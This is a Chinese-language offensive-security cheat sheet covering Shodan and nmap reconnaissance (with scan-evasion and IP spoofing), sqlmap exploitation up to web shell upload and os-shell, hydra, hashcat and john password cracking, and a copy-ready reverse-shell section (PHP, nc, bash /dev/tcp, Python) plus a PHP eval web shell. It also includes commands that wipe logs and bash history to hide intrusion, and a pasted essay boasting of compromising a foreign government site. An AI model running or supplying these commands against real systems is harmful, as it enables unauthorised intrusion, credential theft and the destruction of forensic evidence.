# 片那脆孙

>   From cyberspace mapping engine to shell.

## google

参考：[谷歌黑客语法模板](https://jici-zeroten.github.io/Hacker-Grammar-Templates/)

1.   完全匹配：`"cyberspace security"`
2.   限定文件类型：`filetype:xls "username | password"`
3.   删除指定类型：`fruit -watermelon`
4.   限定域名：`site:www.cnblogs.com`
5.   url 中包含：`inurl:edu.com`
6.   文章标题中包含：`intitle:cyberspace`

## shodan

官方网站：[Shodan](https://shodan.io)

1.   查 hostname 资产：`hostname:cloudflare.com`
2.   查 ip：`ip:1.1.1.1`，指定网段：`net:1.1.1.1/24`
3.   查所有符合某个应用的端口：`port:5432`
4.   指定找设备：`device:router`
5.   指定区域：`country:us`、`region:eu`、`city:newyork`
6.   根据 http 查服务：`http.title:"nginx"`，`http.html:"login"`
7.   指定 os：`os:windows 7`
8.   指定有漏洞：`has_vuln:True`，`vuln:CVE-2022-48174`
9.   waf：`waf:Safedog`

### cli

安装 cli 程序：`sudo apt install python3-shodan`；基本语法：`shodan search [condition]`，condition 参考前文内容

1.   `shodan search --limit 3 --fields ip_str,port [condition]`，查询 3 条 condition 内容、只输出 ip 和 port
2.   查找到特定 ip 后，进一步查看相关信息：`shodan host [ip_addr]`；查看历史部署内容：`shodan host [ip_addr] --history`
3.   批量保存：`shodan download [output] [condition]`，并提取：`shodan parse --fields ip_str,port [output.tar.gz]`

### examples

1.   找一些 router 设备：`shodan search --limit 10 --fields ip_str,port "cisco -authorized port:23"`
2.   找一些后台管理系统：`shodan search --limit 10 --fields ip_str,port http.title:后台`

## fofa

[refer](https://hackeyes.github.io/2021/04/17/fofa%E8%AF%AD%E6%B3%95/)

## nmap

基本语法：`nmap [type] [option] ip`，指定 `-V` 或 `-vv` 以获得详细输出；以 `192.168.0.1/24` 和 `192.168.0.1` 为例

1.   主机发现：

     1.   默认：`nmap 192.168.0.1-255`
     2.   ping 扫描：`nmap -sP 192.168.0.1-255`
     3.   指定扫描速度：`nmap -T[level] 192.168.0.1`，level 有 0-5 级别，越高越快
     4.   扫描活动主机的操作系统：`nmap -O 192.168.0.1`
     5.   扫描活动主机运行的服务：`nmap -sV 192.168.0.1`
     6.   加 `-vvvv` 可以获得更详细的输出

2.   常用扫描：

     `nmap -p 1-255 [type] 192.168.0.1`，type 有以下几种

     | type | 解释                                           |
     | ---- | ---------------------------------------------- |
     | -sS  | TCP SYN，只发 SYN，缩短用时                    |
     | -sT  | `Connect()`，完整三次握手                      |
     | -sA  | ACK，探测 firewall                             |
     | -sW  | Window                                         |
     | -sU  | UDP Scan                                       |
     | -sN  | TCP Null，类似以下二者，属于 firewall 不敏感型 |
     | -sF  | FIN                                            |
     | -sX  | Xmas scans                                     |
     | -sO  | 协议扫描                                       |

4.   反侦察：

     1.   ip 掩体，伪造其他 ip 与真实 ip 一起访问：`nmap -D ip_1,ip_2,ip_3,... 192.168.0.1`
     2.   ip 伪装成 1.1.1.1 在扫描，且必须指定网卡以及禁用主机发现（防止目标阻止 ping）：`nmap -S 1.1.1.1 -e eth0  -Pn 192.168.0.1`
     3.   指定端口来扫描：`nmap -g 53 192.168.0.1`，用 53、67 可以被认为是 dns 或 dhcp 等服务在扫描，具体情况具体分析
     4.   mac 伪装：`nmap --spoof-mac 0 192.168.0.1`，0 表示随机生成 mac
     5.   使用代理：`nmap --proxies http://127.0.0.1:7890 192.168.0.1`
     6.   使用 rootkit：`nmap -sI rootkit_ip:[port] 192.168.0.1`
     7.   一些特定的扫描包有固定长度，采取自动填充垃圾数据的方式来过检测：`nmap --data-length 1500 192.168.0.1`

## gobuster

扫网站目录，src here：[OJ/gobuster](https://github.com/OJ/gobuster)，可通过 `sudo apt install gobuster` 安装，在 `SecLists/Discovery/Web-Content/` 目录下搜索 directory 字符串；

`/home/app/seclists/Discovery/Web-Content/directory-list-2.3-big.txt`

1.   扫域名，指定线程、字典、展示 ip、：`gobuster dns -d google.com -v -t 10 --timeout 5s -w common-names.txt -i `
2.   扫目录，指定线程、字典、文件类型、cookie 信息：`gobuster dir -u http://192.168.0.1 -v -t 10 --timeout 5s  -w directory-list.txt -x html,txt,php -c 'session=foobar'`

## sqlmap

get src here [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap.git)，`sudo apt install sqlmap`

1.   在登录页面中注入，使用 `*` 号指定注入点：`sqlmap -u "http://192.168.0.1/login" --data "username=*&password=*"`
2.   指定 http 方法、cookie、随机 ua、referer、额外 header、时延：`sql -u 'http://192.168.0.1/login' --method=put --data='username=*&password=*' --cookie='session=foobar' --random-agent --referer='http://127.0.0.1/home' --headers='X-Forwarded-For:127.0.0.1\nAccept-Language:en' --delay=10`
3.   获取数据库类型、获取当前使用的数据库、获取当前登录数据库使用的用户：`sqlmap -u "http://192.168.0.1/login" -b --current-db --current-user`
4.   枚举数据库用户名、数据库用户的口令（hash）：`sqlmap -u "http://192.168.0.1/login" --users --password`
5.   枚举所有数据库：`sqlmap -u "http://192.168.0.1/login" --dbs`，枚举数据库中的数据表（需要指定数据库）：`sqlmap -u "http://192.168.0.1/login" -D test --tables`
6.   获取指定数据库中所有表：`sqlmap -u "http://192.168.0.1/login" -D test -T users --columns`，批量获取多列信息并保存：`sqlmap -u "http://192.168.0.1/login" -D test -T users -C user,password --dump`
7.   shell 操作
     1.   查看是否有 dba 权限：`sqlmap -u "http://192.168.0.1/login" --is-dba`，
     2.   读取 host 中的文件：`sqlmap -u "http://192.168.0.1/login" --file-read="/etc/passwd"`
     3.   将本地文件上传到目标目录：`sqlmap -u "http://192.168.0.1/login" --file-write="shell.php" --file-dest="/var/www/html/"`
     4.   获取目标 host 的交互式 shell：`sqlmap -u "http://192.168.0.1/login" --os-shell`

## hydra

用于密码爆破，get src here [vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra.git)，`sudo apt install hydra`；`/home/app/seclists/Passwords/xato-net-10-million-passwords-1000000.txt`；

1.   指定单个用户、密码：`hydra -l admin -p "admin@123" http://192.168.0.1/`

2.   指定用户本、密码本：`hydra -L users.txt -P password.txt http://192.168.0.1/`

3.   生成 8~16 位长的密码：`hydra -x "8:16:aA1&#" http://192.168.0.1/`，其中 a 可以代表所有小写字符，A 代表所有大写，1 代表数字

4.   对表单进行爆破，使用 3 个 `:` 来区分 http-post-form 区域，分别表示目标页面、有效参数、失败提示（尝试先指定 `-d` 尝试获取有效 RECV response，再根据输出判断 fail content）：

     ```bash
     hydra -l admin \
     -P /home/app/seclists/Passwords/xato-net-10-million-passwords-1000000.txt \
     -s 81 \
     127.0.0.1 \
     http-post-form "/api.php?act=login:username=^USER^&password=^PASS^&sub=login:close" \
     -V \
     -f
     ```

     `-l`：指定单个 user，`-L`：指定 user 字典；`-P`：指定密码本位置，`-p`：指定单个密码；`-V`：详细输出，`-f`：只要有成功的尝试就退出

## hashcat

src here：[hashcat/hashcat](https://github.com/hashcat/hashcat.git)；`sudo apt install hashcat`；hashcat 支持的 hash 爆破巨多，输入 `hashcat --help` 可以查看，但是性能需求较大，wsl 给的运存较小，如果用 vmware，给个 8GB 差不多了，越大越好；`/home/app/seclists/Passwords/xato-net-10-million-passwords-1000000.txt`

hashcat 不像 john the ripper，只需要提供 hash 值即可，参考以下匹配 `crack.txt`：

```bash
$ hashcat --help
500  | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)	| Operating System
7400 | sha256crypt $5$, SHA256 (Unix)				| Operating Systems
1800 | sha512crypt $6$, SHA512 (Unix)				| Operating Systems
...

$ cat crack.txt
$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0
...

$ hashcat -m 500 -a 0 -O -o pwned.txt crack.txt /home/app/seclists/Passwords/darkc0de.txt
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: crack.txt
...

$ cat pwned.txt
$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:batman
$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:123456789
$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:service
```

`-m`：指定使用的模式，这里是 500，即 md5 特征；`-a`：指定输入类型为 string；`-O`：自动优化性能；`-o`：破译输出文件；输入文件、字典

## john the ripper

开源、跨平台的密码恢复、密码哈希分析工具 John The Ripper，kali 自带，使用参考：[Cracking /etc/shadow with John](https://erev0s.com/blog/cracking-etcshadow-john/)

Official document here：[Tool Documentation](https://www.kali.org/tools/john/)，install in kali：`sudo apt install john`，app's dictionary file in `/usr/share/john/password.lst`，get third-party dictionary in [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists.git)

### usage

>   拿到 /etc/passwd 和 /etc/shadow，john 批量破解

结合密码文件：`unshadow PASSWORD-FILE SHADOW-FILE`

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh

$ cat /etc/shadow
root:$1$$zdlNHiCDxYDfeF4MZL.H3/:19747:0:99999:7:::

$ unshadow /etc/passwd /etc/shadow > unshadowed.txt

$ cat unshadowed.txt
root:$1$$zdlNHiCDxYDfeF4MZL.H3/:0:0:root:/root:/usr/bin/zsh
```

默认规则破解 hash 值

```bash
$ john --format=md5crypt unshadowed.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 16 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
5up              (Admin)
1g 0:00:03:35 DONE 3/3 (2024-01-18 14:15) 0.004650g/s 393337p/s 393337c/s 393337C/s 5h6+0..samsta05
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

$ john --show unshadowed.txt
Admin:5up:10933:0:99999:7:::
```

>   得知账号名和密码：`admin:250e77f12a5ab6972a0895d290c4792f0a326ea8`，破解之

```bash
$ echo "admin:250e77f12a5ab6972a0895d290c4792f0a326ea8" > crack.txt

$ john --wordlist=/usr/share/john/password.lst crack.txt
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "has-160"
Use the "--format=has-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])
Warning: no OpenMP support for this hash type, consider --fork=16
Press 'q' or Ctrl-C to abort, almost any other key for status
banana           (admin)
1g 0:00:00:00 DONE (2024-01-18 17:06) 100.0g/s 76000p/s 76000c/s 76000C/s asdfg..barry
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed.

$ john --show crack.txt
admin:banana
1 password hash cracked, 0 left
```

也可以快速地检测和尝试破解：`john --single crack.txt`

>   破解 zip 文件密码

先将有密码的 zip 文件导出：`zip2john test.zip > zip.hashes`，然后开始破解密码：`john zip.hashes`

## ciphey

get src here：[Ciphey/Ciphey](https://github.com/Ciphey/Ciphey.git)，；一款命令行解密脚本，不用知道一串东西是什么，只是知道它可能已加密，输入加密的文本，取回解密的文本。适用于对于密码学不太了解的人，或者想在自己进行密文处理之前快速检查密文的人，或者脚本小子；

### installation

主要有三种方式：

-   如果是 python v3.4 - v3.8，`python3 -m pip install ciphey --upgrade`
-   如果是 python 3.10+，可以选择使用新版 [bee-san/Ares](https://github.com/bee-san/Ares.git)：`cargo install project_ares --locked`（`--locked` 指定；安装失败自行寻找 cargo 国内源并配置，也可以配置 proxy），也可以加入 [discord](http://discord.skerritt.blog/) 直接使用 bot
-   全平台使用 docker（推荐）：获取镜像 `sudo docker run -it --rm remnux/ciphey`，使用例 `sudo docker run -it --rm remnux/ciphey $args`，下直接以 `ciphey` 为例

### usage

example：`aHR0cHM6Ly93d3cudGF0YXJhbW9yaWtvLmNvbS9pbmRleC5waHAvcGVuZXRyYXRpb24vMzI0Lmh0bWw=`

1.   命令行类型：`ciphey -t aHR0cHM6Ly93d3cudGF0YXJhbW9yaWtvLmNvbS9pbmRleC5waHAvcGVuZXRyYXRpb24vMzI0Lmh0bWw=`
2.   文件类型：`echo "aHR0cHM6Ly93d3cudGF0YXJhbW9yaWtvLmNvbS9pbmRleC5waHAvcGVuZXRyYXRpb24vMzI0Lmh0bWw=" > /tmp/encrypted.txt`，`ciphey -f /tmp/encrypted.txt`

## shell

src ip：`192.168.0.1`，target ip：`192.168.0.2`，先监听：`rlwrap nc -nvlp 1234`

### php

访问弹 shell，`shell.php`：

```php
<?php $sock=fsockopen("192.168.1.1", 1234);exec("/bin/bash -i <&3 >&3 2>&3");?>
```

上马：`http://192.168.0.2/trojan.php?cmd=[cmd]`，`trojan.php`：

```php
<?php @eval($_GET['cmd']); ?>
```

### nc

一些支持 -e 选项的 nc 版本可以用这个方式弹：`nc -e /bin/sh 192.168.0.1 1234`

如果不支持 -e，则采用这个方式：`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.1 1234 > /tmp/f`

### bash

原教旨：`bash -i >& /dev/tcp/192.168.0.1/1234 0>&1`

### python

命令行直接弹：

```bash
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.1", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```

创建 `shell.py` 弹，`python shell.py`：

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.0.1", 1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```

### rbash

当获得的是一个残缺的 bash 时，可以 [参考](https://xz.aliyun.com/t/7642)，想办法通过各种软件逃脱 rbash 的限制

1.   `su user`，继承当前环境变量并转成 user；`su - user`，不继承当前环境变量并重新启用 user 的环境变量
2.   登录时逃逸，利用 `ssh -t` 强制启用终端会话（例如 `vim` 这类应用需要一个正常的 tty 交互式终端才能显示，`ssh user@ip 'vim'` 无法启动，而 `ssh -t user@ip 'vim'` 可以正常启动，且退出后会自动中断连接），强制终端会话是为了 `/bin/bash` 可以有一个正常的环境
     1.   `ssh user@ip -t "/bin/bash"`

## fscan

内网扫描，get source and release here：[shadow1ng/fscan](https://github.com/shadow1ng/fscan.git)，需要自己编译或者 [下载](https://github.com/shadow1ng/fscan/releases)，将其放到 `/usr/bin/` 目录下

1.   对某一网段进行全面的扫描，并保存：`fscan -h 192.168.0.1/24 -o result.txt`
2.   扫描，但不爆破、不扫描 poc，减少网络流量：`fscan -h 192.168.0.1/24 -np -nobr -nopoc`
3.   不扫描某个 host：`fscan -h 192.168.0.1/24 -hn 192.168.0.1`
4.   指定 ssh 端口进行 ssh 爆破，并尝试执行命令：`fscan -h 192.168.0.1/24 -m ssh -p 8022 -c whoami`
5.   ssh 爆破，指定输入：`fscan -h 192.168.0.1/24 -pwdf passwords.txt -userf users.txt`
6.   使用代理：`fscan -u http://cloudflare.com -proxy http://127.0.0.1:7890`
7.   指定各种模块：`fscan -h 192.168.0.1/24 -m [module]`

## scripts

### linpeas.sh

一个专门用于检测主机所有可能利用的点的脚本，到 [linpeas.sh](https://linpeas.sh/) 获取，想办法在靶机获取后直接运行即可

### directionaries

1.   [danielmiessler/SecLists](https://github.com/danielmiessler/SecLists.git)
2.   [NS-Sp4ce/Dict](https://github.com/NS-Sp4ce/Dict.git)
3.   [r35tart/RW_Password](https://github.com/r35tart/RW_Password.git)
4.   [crackstation-wordlist-password-cracking-dictionary](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

### online hash cracker

1.   [crackstation](https://crackstation.net/)

## base

### 基础信息查询

1.   内核信息：`cat /etc/os-release`，`uname -a`

### 清除登录痕迹

1.   `sudo rm -rf /var/log/*`
2.   `rm ~/.bash_history`
3.   `sudo rm -rf /tmp/*`
4.   `netstat -anp | grep ES`

## tmp

1.   ` shodan search --limit 10 --fields ip_str,port http.title:"初始化宝塔软件"`
2.   `shodan search --fields ip_str,port port:23 "cisco -authorized"`
3.   `shodan search --fields ip_str,port http.title:"棋牌" http.title:"后台"`
4.   `shodan search --fields ip_str,port http.html:"Tas9er "`

## sth

```markdown
很多时候我们都听过这么一种说法，“拿扫描器扫了没洞，要打只有用0day了”，仿佛红队拿下目标站点除了nday和0day两种方法就没别的了。这个说法有道理，很多时候确实是这样，但是并不绝对。每年护网的时候看见其他队伍嘎嘎上分并不是人家上来就用大day子招呼，白盒审计的0day是有局限性的。首先0day杀伤力高同时成本也高，这么多代码一个文件一个文件的看，你就算seem附体一年爆三十个，剔除低危中危以及资产没几个的特定版本的和已经提交src的，那几个0day正好在演练的时候能到用上的几率其实不大，你专门为了护网攒那当我没说。今天这个帖子就总结一下我个人理解的，介于nday和0day之间，一般在国内各种文章被统称为“手法”的这个东西到底具体是个啥。

我对手法的定义是，在没有0day的情况下通过你自身丰富的渗透经验和网络各层面组件框架运行原理的熟悉，对于一个指定的站点，即时的，黑盒的渗透技术。如果说扫哥是亵渎圣剑摁着ctrl不松手无脑复读战技，审计0day是龙王岩剑放雷云化身前摇长但是打中了直接一发送走，那么手法神就是跳劈出血双小曲，会玩的能秀出各种骚姿势层层递进一套组合技行云流水，不会玩的一顿操作看着也挺行云流水的就是没伤害。手法的第一个方向是资产信息收集，很多网课以及培训都会讲，但同时也是初学者在渗透过程中最容易忽略的一步。对于资产多站点多的情况信息收集是非常重要的，爆源码爆密码复用爆社工信息爆子域名爆敏感信息爆c段，等等等等。我这里不细讲以及举具体例子，不是因为这个方向不重要而是我特么不咋熟。你可以去问问那些给公安打博彩盘口的日博哥信息收集有多重要，很多时候网站都是缺口就是从这个方向逐渐打开的，不要老盯着个登录框死磕，你磕不出来啥东西。

手法的第二个方向，是能对使用了框架但是又自己二开了的站点精确打击。有些网站他用了某某框架，但是网站的运维觉得框架还不足以实现他想要的功能就会修改增添文件对网站进行二开处理。比如我之前在频道里发过的某个幽默的go.th泰国政府网站，框架是最新的，扫描器框框扫nday打完了一无所获，结果在网站某路径下边发现一个upload.php页面，原本这个框架是没有的，一看就是网站开发人员自己写的方便实现某些业务，只用了前端js过滤文件后缀，浏览器禁用js，一个shell.php上去就拿到shell了——没用nday也没用0day吧。类似的，验证码伪随机，接口sql注入或者未授权adduser，文件上传点等都是二开源码特色并且不用白盒源码就能测试出来的漏洞。另外像微信小程序，某某测试登录平台，数据管理系统这样的边缘资产大多数都是不用框架自己写的，nday扫不出来漏洞，但是如果手法过硬多测试一下绝对能框框上分。

第三个在站点只有是中危漏洞，比如信息泄露这种，如何结合具体情况巧妙利用最后从中危到getshell。这个时候我相信很多有人会说了，这个简单，我懂，比如xss打到cookies进后台上传图片马未授权访问进后台上传图片马前端信息泄露登录小号进个人主页传图片马弱口令进去后台传图片马，微信公众号都这么写的，爽文记一次xx到getshell实战记一次xx到博彩网getshell从xx到getshell的利用，等等。大部分殊途同归最后都是进后台传图片马 。真正实战的时候大部分后台你webshell是传不上去的，为什么公众号那么多成功的就我一个都遇不到?别老盯着那两篇爽文看，你能看到的当然都是成功了的所以发出来的，没成功的经历你也看不到(你猜猜人家作者为什么文章题目要写个爽文)。中危漏洞玩的花样很多，redis未授权到主从复制rce，任意文件读取读.bash_history读到数据库密码利用特定文件写入函数os shell，xxe读取tomcat-users.xml再配合SSRF来getshell等等。这种从中危到getshell一方面能扩大你的攻击面(很多网站都修高危不修中危低危)，同时大多数都要结合网站具体架构具体操作，难以自动化一键利用，加强这方面能力往往能突破各种扫描器和nday利用工具无法突破的点，比如我之前打韩国真就一个0day没用，稍微有那么一点中危利用的手法，效果其实就很明显了。

第四是，在有nday但是难以利用的特殊情况下能把nday成功利用了。这里就不得不提一下奇安信攻防社区的这篇文章，https://forum.butian.net/share/2596

强到不行的绕过手法和思路。还有个例子是之前在微信读到一篇文章，echo免杀马base64写入再certuti命令解码结果遇到web路径有中文，逆天骚思路把asp站点的web.config里的路径提取出来存在txt中，取路径作为变量批量往里usebackq delims=。锻炼这方面的能力个人建议多打ctf，ctf比赛对于这块的培养是相当强的，(暴论，ctf里的web选手都是手法神)

第五，信息收集搞到源码再白盒审计爆0day，对于那种纯自己写的网站或者小框架，没有历史nday，每个站都审一次，审一次也就打进去这一个站，我称之为事件型0day。有人肯定要说你特么不搞笑吗审一个洞花多大劲就为了这么一次难不成你天天审?事实上天天起0day就为了一个站现场手搓在某些地方是很正常的，你觉得我吹牛也正常，理解，我没证据我也不强求你信，行吧，就这样
```

## refer

1.   shodan 语法参考，[Filter Reference](https://www.shodan.io/search/filters)
2.   nmap 语法参考，[Chapter 15. Nmap Reference Guide](https://nmap.org/book/man.html)
3.   gobuster 语法参考，[Gobuster](https://www.kali.org/tools/gobuster/)
4.   [get a shodan account here](https://maihao.de/)
5.   [实践网络空间搜索引擎应用 & 信息收集](https://xz.aliyun.com/t/9508)
6.   [网络空间搜索引擎的区别](https://xz.aliyun.com/t/9386)
7.   Shodan 漏洞扫描教程，bilibili/av760726529
8.   反弹 shell 参考，[Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
9.   hashcat 密码类型参考，[Generic hash types](https://hashcat.net/wiki/doku.php?id=example_hashes)
10.   [开源项目信息泄露笔记](https://blog.zgsec.cn/archives/205.html)
11.   [应急响应实战笔记](https://github.com/Bypass007/Emergency-Response-Notes.git)
12.   [1earn](https://github.com/ffffffff0x/1earn.git)
13.   [maldev academy](https://maldevacademy.com/)